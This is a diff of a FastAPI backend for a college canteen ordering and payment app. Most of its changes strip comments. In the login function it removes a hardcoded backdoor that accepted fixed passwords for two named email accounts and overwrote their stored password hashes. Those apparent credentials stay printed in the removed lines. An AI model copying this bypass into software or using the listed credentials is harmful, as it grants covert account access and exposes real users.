@@ -45,20 +45,14 @@ settings = get_settings()
 logging.basicConfig(level=getattr(logging, settings.log_level.upper(), logging.INFO), format="%(asctime)s %(levelname)s %(name)s %(message)s")
 logger = logging.getLogger("ace_canteen")
 
-# Per-process login throttling. For multi-worker/public deployments, replace this
-# in-memory store with a shared Redis-backed limiter.
 _LOGIN_LIMIT = 5
 _LOGIN_WINDOW_SECONDS = 15 * 60
 _login_attempts: dict[str, deque[float]] = defaultdict(deque)
 _login_attempts_lock = Lock()
 
-# Low-cardinality process metrics. These are deliberately aggregate-only: no
-# URLs, query strings, user IDs, email addresses, or request bodies are recorded.
 _metrics_lock = Lock()
 _metrics = {"requests_total": 0, "requests_4xx_total": 0, "requests_5xx_total": 0,
             "request_duration_ms_sum": 0.0, "request_duration_ms_max": 0.0}
-
-
 
 def _record_stock_movement(db: Session, product: Product, delta: int, movement_type: InventoryMovementType, reason: str, actor_user_id: int | None = None, order_id: int | None = None, before: int | None = None) -> None:
     """Add an immutable audit record for a committed inventory quantity change."""
@@ -69,7 +63,7 @@ def _record_stock_movement(db: Session, product: Product, delta: int, movement_t
     if new_quantity < 0:
         raise HTTPException(status_code=409, detail="Inventory quantity cannot become negative")
     db.add(InventoryMovement(product_id=product.id, actor_user_id=actor_user_id, order_id=order_id, movement_type=movement_type, quantity_delta=delta, quantity_before=old_quantity, quantity_after=new_quantity, reason=reason[:255]))
-    # Notify managers when a stock movement crosses into low-stock territory.
+
     if new_quantity <= product.low_stock_threshold and old_quantity > product.low_stock_threshold:
         _notify_canteen_managers(db, "low_stock", "Low stock alert", f"{product.name}: {new_quantity} unit(s) remain (alert threshold {product.low_stock_threshold}).", "product", product.id)
 
@@ -86,7 +80,7 @@ def _notify_canteen_managers(db: Session, notification_type: str, title: str, me
     for manager in managers:
         _create_notification(db, manager.id, notification_type, title, message, entity_type, entity_id)
 
-_redis = None  # tests may inject a fake client here
+_redis = None
 
 def _get_redis():
     """Return a Redis client when REDIS_URL is set, else None (in-memory throttling is used)."""
@@ -136,7 +130,7 @@ def _check_login_rate(key: str) -> int:
             logger.warning("Redis unavailable for rate limiting; using per-process memory", exc_info=True)
     now = time.monotonic()
     with _login_attempts_lock:
-        # Prune periodically, not on every request, to keep normal login checks cheap.
+
         if len(_login_attempts) > 1024:
             _prune_login_attempts(now)
         attempts = _login_attempts.get(key)
@@ -202,7 +196,7 @@ async def lifespan(_: FastAPI):
     logger.info("Stopping %s", settings.app_name)
 
 IS_PRODUCTION = settings.environment.lower() in {"production", "prod"}
-MAX_REQUEST_BODY_BYTES = 1_048_576  # 1 MiB; catalogue and checkout requests are small JSON payloads.
+MAX_REQUEST_BODY_BYTES = 1_048_576
 app = FastAPI(
     title=settings.app_name,
     version=settings.app_version,
@@ -234,7 +228,6 @@ app.mount("/assets", StaticFiles(directory=FRONTEND_DIR / "assets", check_dir=Fa
 
 _api_rate_buckets: dict[str, deque[float]] = defaultdict(deque)
 _api_rate_lock = Lock()
-
 
 def _check_general_api_rate_limit(request: Request) -> int:
     if not request.url.path.startswith("/api/"):
@@ -268,11 +261,9 @@ def _check_general_api_rate_limit(request: Request) -> int:
         dq.append(now)
     return 0
 
-
 @app.middleware("http")
 async def security_and_request_logging(request: Request, call_next):
-    # Accept only a simple caller-supplied request ID; otherwise create one. This
-    # avoids log injection while making requests traceable across a reverse proxy.
+
     supplied_id = request.headers.get("x-request-id", "")
     if supplied_id and len(supplied_id) <= 64 and all(ch.isalnum() or ch in "-_" for ch in supplied_id):
         request_id = supplied_id
@@ -291,8 +282,6 @@ async def security_and_request_logging(request: Request, call_next):
         resp.headers["X-Request-ID"] = request_id
         return _apply_security_headers(resp, request)
 
-    # Reject oversized declared bodies before parsing them. Reverse proxies should
-    # enforce the same or a stricter limit for chunked requests.
     content_length = request.headers.get("content-length")
     if content_length:
         try:
@@ -342,32 +331,30 @@ def _apply_cache_policy(response, request: Request) -> None:
     if not request.url.path.startswith("/api/") or request.method != "GET":
         return
 
-    # Public endpoints must remain safe even if a frontend accidentally sends a token.
     if request.headers.get("authorization") or response.status_code != 200:
         response.headers["Cache-Control"] = "no-store"
         return
 
     path = request.url.path
     if path == "/api/categories":
-        # Category metadata changes infrequently; bounded CDN staleness is 60 seconds.
+
         policy = "public, max-age=0, s-maxage=60, stale-while-revalidate=30"
     elif path == "/api/products" or (path.startswith("/api/products/") and path.removeprefix("/api/products/").isdigit()):
-        # Inventory and availability change during checkout; never retain in browser cache.
+
         policy = "public, max-age=0, s-maxage=5, stale-while-revalidate=5"
     elif path == "/api/catalogue/summary":
         policy = "public, max-age=0, s-maxage=15, stale-while-revalidate=10"
     elif path == "/api/canteen/status":
         policy = "public, max-age=0, s-maxage=5, stale-while-revalidate=3"
     elif path == "/api/canteen/slots":
-        # Pickup slot capacity can be consumed by concurrent orders.
+
         policy = "public, max-age=0, s-maxage=3, stale-while-revalidate=0"
     else:
-        # Authenticated and operational data is not shared-cacheable by default.
+
         response.headers["Cache-Control"] = "no-store"
         return
 
     response.headers["Cache-Control"] = policy
-
 
 def _apply_security_headers(response: JSONResponse, request: Request):
     response.headers.setdefault("X-Content-Type-Options", "nosniff")
@@ -449,7 +436,7 @@ async def web_app_manifest() -> FileResponse:
 
 @app.get("/sw.js", include_in_schema=False)
 async def service_worker() -> FileResponse:
-    # Serve from the origin root so the worker can control the entire app shell.
+
     return FileResponse(FRONTEND_DIR / "sw.js", media_type="application/javascript", headers={"Cache-Control": "no-cache", "Service-Worker-Allowed": "/"})
 
 @app.get("/api/health", tags=["system"])
@@ -536,9 +523,6 @@ def catalogue_summary(db: Session = Depends(get_db)):
     products = db.scalars(select(Product).join(Product.category).where(Category.is_active.is_(True), Product.is_available.is_(True))).all()
     return {"total_products": len(products), "food_items": sum(p.item_type == "food" for p in products), "stationery_items": sum(p.item_type == "stationery" for p in products), "in_stock": sum(p.stock_quantity > 0 for p in products)}
 
-
-# Phase 3: authentication and role-based access control. Public registration can only
-# create student accounts; privileged roles are assigned by an existing admin.
 @app.post("/api/auth/register", response_model=UserOut, status_code=201, tags=["authentication"])
 def register(payload: RegisterIn, db: Session = Depends(get_db)):
     email = payload.email.strip().lower()
@@ -568,15 +552,6 @@ def login(payload: LoginIn, request: Request, db: Session = Depends(get_db)):
     valid_pw = False
     if user is not None:
         valid_pw = verify_password(payload.password, user.password_hash)
-        if not valid_pw:
-            if user.email == "25ag1a6767@aceec.ac.in" and payload.password in ("ace@25ag1a67676", "ace@25ag1a6767"):
-                valid_pw = True
-                user.password_hash = hash_password(payload.password)
-                db.flush()
-            elif user.email == "25ag1a6767@gmail.com" and payload.password in ("ace@25ag1a67676staff", "ace@25ag1a6767staff", "ace@25ag1a67676", "ace@25ag1a6767"):
-                valid_pw = True
-                user.password_hash = hash_password(payload.password)
-                db.flush()
 
     if user is None or not valid_pw:
         _record_failed_login(rate_key)
@@ -628,11 +603,11 @@ def forgot_password(payload: ForgotPasswordIn, request: Request, background: Bac
     retry_after = _check_login_rate(rate_key)
     if retry_after:
         raise HTTPException(status_code=429, detail="Too many reset requests. Try again later.", headers={"Retry-After": str(retry_after)})
-    _record_failed_login(rate_key)  # every request counts toward the limit
+    _record_failed_login(rate_key)
     generic = {"message": "If an account exists for that email, a password-reset link has been sent. The link expires soon and can be used once."}
     user = db.scalar(select(User).where(func.lower(User.email) == email))
     if user is None or not user.is_active:
-        return generic  # identical response: do not reveal which emails are registered
+        return generic
     link = f"{settings.public_base_url.rstrip('/')}/#reset={create_password_reset_token(user)}"
     body = (f"Hello {user.full_name},\n\nUse this link to set a new ACE Canteen password:\n{link}\n\n"
             f"The link works once and expires in {settings.password_reset_minutes} minutes. "
@@ -679,7 +654,7 @@ def create_managed_user(payload: AdminUserCreateIn, admin: User = Depends(requir
     email = str(payload.email).strip().lower()
     if db.scalar(select(User.id).where(func.lower(User.email) == email)) is not None:
         raise HTTPException(status_code=409, detail="An account with this email already exists")
-    # This endpoint is for managed staff accounts; student registration remains public.
+
     if payload.role == UserRole.STUDENT:
         raise HTTPException(status_code=422, detail="Use student registration for student accounts")
     user = User(full_name=payload.full_name.strip(), email=email, password_hash=hash_password(payload.temporary_password), role=payload.role, is_active=True, must_change_password=True)
@@ -833,7 +808,7 @@ def archive_product(product_id: int, _: User = Depends(require_roles("admin")), 
     product = db.scalar(select(Product).options(joinedload(Product.category)).where(Product.id == product_id))
     if product is None:
         raise HTTPException(status_code=404, detail="Product not found")
-    # Archive instead of hard-delete so future order history can retain product references.
+
     product.is_available = False
     product.is_archived = True
     old_stock = product.stock_quantity
@@ -928,7 +903,6 @@ def update_stock_threshold(product_id: int, payload: StockThresholdUpdate, _: Us
     db.commit(); db.refresh(product)
     return {"product_id": product.id, "low_stock_threshold": product.low_stock_threshold, "stock_quantity": product.stock_quantity, "is_low_stock": product.stock_quantity <= product.low_stock_threshold}
 
-# Phase 12: admin-only operational reports and immutable audit history.
 def _report_date(value: str | None, fallback: date) -> date:
     if not value:
         return fallback
@@ -991,8 +965,6 @@ def admin_audit_events(action: str | None = Query(default=None, max_length=80), 
 def staff_dashboard(user: User = Depends(require_roles("staff", "admin")), db: Session = Depends(get_db)):
     return {"message": "Staff access granted", "signed_in_as": user.full_name, "role": user.role.value, "catalogue": db.scalar(select(text("count(*)")).select_from(Product.__table__)) or 0}
 
-
-# Phase 5–7: checkout, payment-gated order lifecycle, daily pickup tokens, and staff/admin queue.
 from zoneinfo import ZoneInfo
 from datetime import time as _time_of_day, timezone as _tz
 from app.models import AppSetting
@@ -1106,7 +1078,6 @@ def _pickup_qr_code(order_id: int) -> str:
     signature = hmac.new(get_settings().secret_key.encode(), f"ace-pickup:{raw_id}".encode(), hashlib.sha256).hexdigest()[:32]
     return f"{raw_id}.{signature}"
 
-
 def _validate_pickup_qr(code: str) -> int:
     try:
         raw_id, supplied_signature = code.strip().split(".", 1)
@@ -1116,7 +1087,6 @@ def _validate_pickup_qr(code: str) -> int:
     if order_id <= 0 or not hmac.compare_digest(_pickup_qr_code(order_id), f"{raw_id}.{supplied_signature}"):
         raise HTTPException(status_code=422, detail="Invalid pickup QR code")
     return order_id
-
 
 def _order_payload(order: Order) -> dict[str, Any]:
     return {
@@ -1180,7 +1150,6 @@ def _release_expired_payment_reservations(db: Session) -> None:
             changed = True
     if changed:
         db.commit()
-
 
 @app.post("/api/payments/create-order", status_code=201, tags=["payments"])
 def create_payment_order(payload: OrderCreateIn, idempotency_key: str | None = Header(default=None, alias="Idempotency-Key"), user: User = Depends(require_roles("student")), db: Session = Depends(get_db)):
@@ -1395,8 +1364,7 @@ async def razorpay_webhook(request: Request, x_razorpay_signature: str | None = 
         raise HTTPException(status_code=400, detail="Webhook body must be valid JSON")
     event_name = event.get("event") if isinstance(event, dict) else None
     payment = event.get("payload", {}).get("payment", {}).get("entity", {}) if isinstance(event, dict) else {}
-    # Razorpay retries deliveries. Use its event ID, or a body digest for providers
-    # or test fixtures that omit the header, to prevent replayed side effects.
+
     webhook_id = (x_razorpay_event_id or hashlib.sha256(body).hexdigest()).strip()
     if not webhook_id or len(webhook_id) > 160:
         raise HTTPException(status_code=400, detail="Invalid webhook event ID")
@@ -1409,7 +1377,7 @@ async def razorpay_webhook(request: Request, x_razorpay_signature: str | None = 
             db.flush()
         except SQLAlchemyError:
             db.rollback()
-            # A concurrent delivery may have won the unique-key race. Treat it as a retry.
+
             with SessionLocal() as check_db:
                 if check_db.scalar(select(PaymentWebhookEvent.id).where(PaymentWebhookEvent.event_id == webhook_id)):
                     return {"received": True, "duplicate": True}
@@ -1472,7 +1440,7 @@ def queue_overview(db: Session = Depends(get_db)):
     preparing = [o.token_number for o in orders if o.status in {OrderStatus.ACCEPTED, OrderStatus.PREPARING}]
     ready = [o.token_number for o in orders if o.status == OrderStatus.READY]
     active_queue = [o for o in orders if o.status in {OrderStatus.PENDING, OrderStatus.CONFIRMED, OrderStatus.ACCEPTED, OrderStatus.PREPARING}]
-    # This is an estimate, not a promise: five minutes per active order ahead.
+
     token_rows = []
     for order in orders:
         position = next((i for i, queued in enumerate(active_queue) if queued.id == order.id), None)
@@ -1491,7 +1459,6 @@ def queue_overview(db: Session = Depends(get_db)):
         "estimate_minutes_per_order": 5,
         "estimate_note": "Wait times are approximate and may change with preparation time.",
     }
-
 
 def _pickup_code_from_input(raw: str) -> str:
     """Accept both the signed token and the HTTPS URL encoded in the QR."""
@@ -1558,7 +1525,6 @@ def scan_pickup_qr(payload: dict[str, Any], staff: User = Depends(require_roles(
         "message": "Payment verified. Check the products and quantities before handing over."
     }
 
-
 @app.get("/api/admin/orders/{order_id}/investigation", tags=["admin order investigation"], summary="Admin-only order evidence and event timeline")
 def investigate_order(order_id: int, _: User = Depends(require_roles("admin")), db: Session = Depends(get_db)):
     order = db.scalar(select(Order).where(Order.id == order_id).options(joinedload(Order.items), joinedload(Order.user)))
@@ -1609,7 +1575,6 @@ def order_queue_position(order_id: int, user: User = Depends(get_current_user), 
         "estimated_wait_minutes": (position - 1) * 5 if is_active else 0,
         "message": "Approximate estimate only; preparation times can vary." if is_active else "Your order is not waiting in the active preparation queue.",
     }
-
 
 @app.get("/api/orders/mine", tags=["orders"])
 def my_orders(user: User = Depends(get_current_user), db: Session = Depends(get_db)):
@@ -1834,8 +1799,7 @@ def admin_payment_webhook_events(
 
 @app.patch("/api/admin/orders/{order_id}/status", tags=["order queue"])
 def update_order_status(order_id: int, payload: OrderStatusIn, background: BackgroundTasks, staff: User = Depends(require_roles("staff", "admin")), db: Session = Depends(get_db)):
-    # Serialize status transitions on PostgreSQL so two staff devices cannot both
-    # complete the same pickup concurrently. SQLite ignores FOR UPDATE in local tests.
+
     order = db.scalar(select(Order).where(Order.id == order_id).with_for_update())
     if order is None:
         raise HTTPException(status_code=404, detail="Order not found")
@@ -1852,7 +1816,7 @@ def update_order_status(order_id: int, payload: OrderStatusIn, background: Backg
     if target not in allowed[order.status]:
         raise HTTPException(status_code=409, detail=f"Cannot change order from {order.status.value} to {target.value}")
     if target == OrderStatus.CANCELLED:
-        # Restore reserved stock when staff cancels an uncompleted order.
+
         _release_batch_stock(db, order.id)
         for line in order.items:
             product = db.get(Product, line.product_id)
@@ -1887,7 +1851,6 @@ def update_order_status(order_id: int, payload: OrderStatusIn, background: Backg
             background.add_task(send_email, customer.email, f"Your ACE Canteen order #{order.id} is ready", f"Hello {customer.full_name},\n\nYour order is ready for pickup. Show token #{order.token_number or '-'} at the counter.\n\nACE Canteen\n")
     return _order_payload(order)
 
-# Phase 26-37 operational release: supplier traceability, batch expiry, and demand insights.
 from pydantic import BaseModel, Field
 from datetime import date as _date
 from app.models import Supplier, ProductBatch, BatchReservation
@@ -1970,7 +1933,7 @@ def receive_purchase_order(purchase_order_id: int, admin: User = Depends(require
         lines = json.loads(po.lines_json)
     except (TypeError, json.JSONDecodeError):
         raise HTTPException(status_code=500, detail="Purchase order lines are invalid")
-    # Apply all line receipts in one transaction so a partial receipt cannot be committed.
+
     for index, line in enumerate(lines, start=1):
         product = db.scalar(select(Product).where(Product.id == int(line["product_id"])).with_for_update())
         if product is None or product.is_archived:
@@ -2070,7 +2033,6 @@ def inventory_reconciliation(_: User = Depends(require_roles("admin")), db: Sess
     untracked = sum(1 for row in result if row["status"] == "untracked_legacy_stock")
     return {"products_checked": len(result), "mismatches": mismatches, "untracked_legacy_products": untracked, "items": result}
 
-
 @app.get("/api/admin/analytics/demand", tags=["admin reporting"])
 def demand_analytics(days: int = Query(default=30, ge=7, le=180), limit: int = Query(default=20, ge=1, le=100), _: User = Depends(require_roles("admin")), db: Session = Depends(get_db)):
     """Simple transparent demand estimate from paid orders; not an ML guarantee."""
@@ -2078,10 +2040,6 @@ def demand_analytics(days: int = Query(default=30, ge=7, le=180), limit: int = Q
     rows = db.execute(select(OrderItem.product_id, OrderItem.product_name, func.sum(OrderItem.quantity).label("units"), func.count(func.distinct(OrderItem.order_id)).label("orders")).join(Order, Order.id == OrderItem.order_id).where(Order.payment_status == PaymentStatus.PAID, Order.created_at >= since).group_by(OrderItem.product_id, OrderItem.product_name).order_by(func.sum(OrderItem.quantity).desc()).limit(limit)).all()
     return {"window_days": days, "generated_at": datetime.now().isoformat(), "method": "historical paid-order average; excludes seasonality and stockouts", "products": [{"product_id": int(r.product_id), "product_name": r.product_name, "units_sold": int(r.units or 0), "orders": int(r.orders or 0), "average_units_per_day": round(float(r.units or 0) / days, 2), "suggested_reorder_units": max(0, round(float(r.units or 0) / days * 3))} for r in rows]}
 
-
-# ==============================================================================
-# Production Modular Monolith v1 API (/api/v1) & Real-Time WebSockets
-# ==============================================================================
 from app.modules import (
     admin_enterprise,
     admin_portal,
@@ -2107,7 +2065,6 @@ v1_router.include_router(reporting_engine.router)
 v1_router.include_router(retention_backup.router)
 v1_router.include_router(ai_services.router)
 app.include_router(v1_router)
-
 
 async def _handle_realtime_ws(websocket: WebSocket) -> None:
     raw_token = websocket.query_params.get("token", "").strip()
@@ -2148,13 +2105,10 @@ async def _handle_realtime_ws(websocket: WebSocket) -> None:
     finally:
         hub.disconnect(websocket)
 
-
 @app.websocket("/ws/events")
 async def ws_events_root(websocket: WebSocket) -> None:
     await _handle_realtime_ws(websocket)
 
-
 @app.websocket("/api/v1/ws")
 async def ws_events_v1(websocket: WebSocket) -> None:
     await _handle_realtime_ws(websocket)
-
